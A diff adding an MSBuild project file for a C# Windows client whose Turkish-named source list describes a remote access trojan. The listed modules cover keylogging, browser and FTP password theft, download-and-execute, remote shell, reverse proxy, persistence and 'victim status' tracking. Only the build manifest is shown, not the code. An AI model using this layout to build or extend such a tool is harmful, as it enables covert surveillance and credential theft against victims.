@@ -1,0 +1,274 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>8.0.30703</ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{9F5CF56A-DDB2-4F40-AB99-2A1DC47588E1}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>xClient</RootNamespace>
+    <AssemblyName>Client</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\Bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\Bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <DebugSymbols>false</DebugSymbols>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>xClient.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="KuuhakuÇekirdek\Eylemler\KayıtDefteriİşleyicisi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Veri\ClientVerisi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Veri\CoğrafikBilgi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\MutexHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\WindowsAccountHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\DosyaYardımcısı.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\FormatYardımcısı.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\HostHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\NativeMethodsHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\PlatformHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\RegistryKeyHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\ScreenHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\CihazYardımcısı.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\SystemHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurulum\ClientYükleyici.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurulum\ClientKaldırıcı.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurulum\ClientGüncelleyici.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurulum\Başlangıç.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\CodeGenContext.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\Yardımcılar.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\ITypeSerializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\Primitives.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\Serializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\TypeSerializers\ArraySerializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\TypeSerializers\DictionarySerializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\TypeSerializers\EnumSerializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\TypeSerializers\GenericSerializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\TypeSerializers\ObjectSerializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\NetSerializer\TypeSerializers\PrimitivesSerializer.cs" />
+    <Compile Include="KuuhakuÇekirdek\Ağ\Client.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eylemler\Eylemİşleyicisi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eylemler\Bağlantıİşleyicisi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eylemler\Dosyaİşleyicisi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eylemler\Karışıkİşleyiciler.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eylemler\Gözetimİşleyicisi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eylemler\Sistemİşleyicisi.cs" />
+    <Compile Include="KuuhakuÇekirdek\Sıkıştırma\SafeQuickLZ.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kriptografi\AES.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kriptografi\SHA256.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eklentiler\KayıtDefteriAnahtarıEklentileri.cs" />
+    <Compile Include="KuuhakuÇekirdek\Ağ\KuuhakuClient.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetChangeRegistryValueResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetCreateRegistryKeyResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetCreateRegistryValueResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetDeleteRegistryKeyResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetDeleteRegistryValueResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetPasswordsResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetRegistryKeysResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetRenameRegistryKeyResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetRenameRegistryValueResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\SetStatusFileManager.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoChangeRegistryValue.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoCreateRegistryKey.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoCreateRegistryValue.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoDeleteRegistryKey.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoDeleteRegistryValue.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoKeyboardEvent.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoLoadRegistryKey.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoRenameRegistryKey.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoRenameRegistryValue.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetPasswords.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\SetAuthenticationSuccess.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\FtpClients\FileZilla.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\FtpClients\WinSCP.cs" />
+    <Compile Include="KuuhakuÇekirdek\KayıtDefteri\RegistryEditor.cs" />
+    <Compile Include="KuuhakuÇekirdek\KayıtDefteri\RegistrySeeker.cs" />
+    <Compile Include="KuuhakuÇekirdek\KayıtDefteri\RegistrySeekerParams.cs" />
+    <Compile Include="KuuhakuÇekirdek\KayıtDefteri\RegSeekerMatch.cs" />
+    <Compile Include="KuuhakuÇekirdek\KayıtDefteri\RegValueData.cs" />
+    <Compile Include="KuuhakuÇekirdek\Utilityler\FileSplit.cs" />
+    <Compile Include="KuuhakuÇekirdek\Veri\Host.cs" />
+    <Compile Include="KuuhakuÇekirdek\Utilityler\HostsManager.cs" />
+    <Compile Include="KuuhakuÇekirdek\Utilityler\NativeMethods.cs" />
+    <Compile Include="KuuhakuÇekirdek\Utilityler\UnsafeStreamCodec.cs" />
+    <Compile Include="KuuhakuÇekirdek\Sıkıştırma\JpgCompression.cs" />
+    <Compile Include="KuuhakuÇekirdek\Eklentiler\SoketEklentileri.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\AnaHook.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\HotKeys\HotKeyArgs.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\HotKeys\HotKeySeti.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\HotKeys\HotKeySetCollection.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\KlavyeEylemleri.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\KlavyeFareEylemleri.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\FareEylemleri.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\AppEventFacade.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\AppKeyListener.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\AppMouseListener.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\BaseListener.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\TuşSeti.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\Callback.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\EventFacade.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\GlobalEventFacade.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\GlobalKeyListener.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\GlobalMouseListener.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\KeyboardState.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\KeyListener.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\MouseListener.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\Implementation\Subscribe.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\EventArgsExtKlavye.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\EventArgsExtTuşBasımı.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\KeyloggerHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\EventArgsExtFare.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\AppMouseStruct.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\CallbackData.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\HookHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\HookIds.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\HookNativeMethods.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\HookProcedure.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\HookProcedureHandle.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\HookResult.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\KeyboardHookStruct.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\KeyboardNativeMethods.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\Messages.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\MouseNativeMethods.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\MouseStruct.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\Point.cs" />
+    <Compile Include="KuuhakuÇekirdek\MouseKeyHook\WinApi\ThreadNativeMethods.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetDesktopResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetDirectoryResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\DoDownloadFileResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetDrivesResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetKeyloggerLogsResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetProcessesResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetStartupItemsResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetSystemInfoResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetMonitorsResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\DoShellExecuteResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\SetUserStatus.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\Paketİşleyici.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoShutdownAction.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoStartupItemAdd.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoUploadFile.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetDesktop.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetDirectory.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoPathDelete.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoPathRename.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoDownloadFile.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoDownloadFileCancel.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetDrives.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetKeyloggerLogs.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetStartupItems.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetSystemInfo.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoProcessKill.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetMonitors.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoStartupItemRemove.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoShellExecute.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoShowMessageBox.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoClientUpdate.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoUploadAndExecute.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoVisitWebsite.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoMouseEvent.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoProcessStart.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetProcesses.cs" />
+    <Compile Include="KuuhakuÇekirdek\Utilityler\Shell.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Tarayıcılar\Chrome.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Tarayıcılar\Firefox.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Utilities\Chromium.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Utilities\JsonUtil.cs" />
+    <Compile Include="KuuhakuÇekirdek\Veri\KurtarılanHesaplar.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Utilities\SQLiteHandler.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Tarayıcılar\InternetExplorer.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Tarayıcılar\Opera.cs" />
+    <Compile Include="KuuhakuÇekirdek\Kurtarma\Tarayıcılar\Yandex.cs" />
+    <Compile Include="KuuhakuÇekirdek\ReverseProxy\Packets\ReverseProxyConnect.cs" />
+    <Compile Include="KuuhakuÇekirdek\ReverseProxy\Packets\ReverseProxyConnectResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\ReverseProxy\Packets\ReverseProxyData.cs" />
+    <Compile Include="KuuhakuÇekirdek\ReverseProxy\Packets\ReverseProxyDisconnect.cs" />
+    <Compile Include="KuuhakuÇekirdek\ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="KuuhakuÇekirdek\ReverseProxy\ReverseProxyCommandHandler.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\SetStatus.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ClientPaketleri\GetAuthenticationResponse.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\IPacket.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoClientDisconnect.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoDownloadAndExecute.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoClientUninstall.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\GetAuthentication.cs" />
+    <Compile Include="KuuhakuÇekirdek\Paketler\ServerPaketleri\DoClientReconnect.cs" />
+    <Compile Include="KuuhakuÇekirdek\Yardımcılar\GeoLocationHelper.cs" />
+    <Compile Include="KuuhakuÇekirdek\Utilityler\Keylogger.cs" />
+    <Compile Include="Enumlar\FareEylemleri.cs" />
+    <Compile Include="Enumlar\DizinTürleri.cs" />
+    <Compile Include="Enumlar\KayıtDefteriAraması.cs" />
+    <Compile Include="Enumlar\KapatmaEylemleri.cs" />
+    <Compile Include="Enumlar\KurbanDurumu.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Ayarlar\Settings.cs" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.manifest" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent>copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
+  </PropertyGroup>
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
